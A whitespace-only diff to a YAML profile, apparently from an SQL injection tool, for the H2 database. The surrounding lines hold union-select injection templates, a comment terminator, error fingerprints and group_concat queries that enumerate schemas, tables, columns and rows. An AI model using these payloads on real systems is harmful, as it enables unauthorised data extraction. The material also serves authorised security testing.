@@ -1,6 +1,6 @@
 vendor: H2
 
-resource: 
+resource:
  info: |
   concat(
       concat_ws(
@@ -11,8 +11,8 @@ resource:
       ),
       '${trail_sql}'
   )
-  
- schema: 
+
+ schema:
   database: |
    select concat(
        group_concat(
@@ -35,7 +35,7 @@ resource:
        group by r
        ${limit}
    ) x
-   
+
   table: |
    select concat(
        group_concat(
@@ -53,7 +53,7 @@ resource:
        order by r
        ${limit}
    ) x
-   
+
   column: |
    select concat(
        group_concat(
@@ -72,8 +72,8 @@ resource:
        order by n
        ${limit}
    ) x
-   
-  row: 
+
+  row:
    query: |
     select concat(
         group_concat(
@@ -82,7 +82,7 @@ resource:
             || '${separator_qte_sql}'
             || cast(q as char)
             || '${enclose_value_sql}'
-            order by r 
+            order by r
             separator '${separator_cell_sql}'
         ),
         '${trail_sql}'
@@ -94,12 +94,12 @@ resource:
         group by r
         ${limit}
     ) x
-   fields: 
+   fields:
     field: trim(ifnull(`${field.value}`, ''))
     concat: "|| '%7f' ||"
-    
-strategy: 
- configuration: 
+
+strategy:
+ configuration:
   slidingWindow: |
    (
        select
@@ -123,18 +123,18 @@ strategy:
   calibrator: repeat('${calibrator_sql}', 65536)
   limitBoundary: 0
   endingComment: --+-
-  fingerprint: 
-   errorMessage: 
+  fingerprint:
+   errorMessage:
     - h2 database
-    
- normal: 
+
+ normal:
   indices: union select ${indices}
   capacity: |
    (
-       select 
+       select
            concat(
-               '${lead}', 
-               ${indice}, 
+               '${lead}',
+               ${indice},
                ${calibrator}
            )
    )
